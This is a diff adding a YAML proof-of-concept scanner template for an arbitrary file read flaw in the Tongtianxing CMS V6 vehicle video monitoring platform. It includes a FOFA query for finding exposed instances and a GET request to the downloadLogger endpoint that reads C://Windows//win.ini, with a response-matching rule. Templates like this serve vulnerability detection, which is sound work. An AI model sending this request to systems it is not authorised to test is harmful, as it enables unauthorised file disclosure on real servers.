@@ -1,0 +1,15 @@
+id: poc-yaml-g-sky-cmsv6-downloadlogger-anyfile-read
+info:
+  name: 通天星CMS V6车载视频监控平台 downloadLogger 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: cmsv6
+  fofa: body="./open/webApi.html" || body="/808gps/"
+requests:
+- method: GET
+  path: /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"; for
+    16-bit app support") && contains(headers,"filename=") && !contains(body,"<")
+variables: {}
+transport: http
